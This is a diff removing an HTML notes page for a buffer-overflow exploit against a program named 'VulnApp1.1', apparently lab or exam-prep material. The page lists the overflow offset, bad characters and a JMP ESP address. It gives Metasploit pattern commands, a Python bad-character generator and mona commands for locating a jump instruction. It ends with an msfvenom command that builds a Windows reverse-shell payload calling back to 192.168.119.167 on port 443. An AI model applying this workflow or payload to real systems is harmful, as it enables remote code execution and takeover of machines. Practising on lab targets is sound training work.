@@ -1,8 +1,0 @@
-<!doctype html><html>
-    <head>
-      <meta http-equiv="content-type" content="text/html; charset=utf-8">
-      <title>VulnApp1.1</title>
-      <meta name="generator" content="CherryTree">
-      <link rel="stylesheet" href="res/styles3.css" type="text/css" />
-    </head>
-    <body><div class='page'><h1 class='title'>VulnApp1.1</h1><br/>Bytes to break            = 2560<br />break Confirmed         = X<br />Exact Location            = 2288 <br />overwrite confirmed    = X<br />Shellcode space          = 1800<br />badchars                    = 0x00<br />JMP ESP                      = 148010cf<br />little endian JMP ESP   = cf108014<br /><br /><br /><br /><br /><br /><br /><br /><br />Find Offset<br />/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l <br />/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <br /><br />Find BadChar<br />c = &quot;&quot;<br />cl = []<br />badchar = [0x00]<br />for ch in range (0x00 , 0xFF+1):<br />        if ch not in badchar:<br />                cl.append(chr(ch))<br />for i in cl:<br />        c += i<br />input(c)<br /><br />to find JMP ESP<br />    !mona jmp -r esp -cpb “\x00\x0A”        &lt;&lt; bad charachters<br />        ^^^ may lead you right to it<br />    !mona modules<br />        look for a .exe or dll with ASLR, DEP, and Rebase disabled. (ALso no bad chars in the address)<br />        !mona find -s “\xff\xe4” -m yeet.dll<br />            ^^^Look at address<br />      if all else fails in the top left pane Ctrl f for JMP ESP<br />      <br />      <br />Payload<br />    msfvenom -p windows/shell_reverse_tcp LHOST=192.168.119.167 LPORT=443 -f c -a x86 --platform windows -b \\x00 -e x86/alpha_upper &gt; payload.txt</div></body></html>
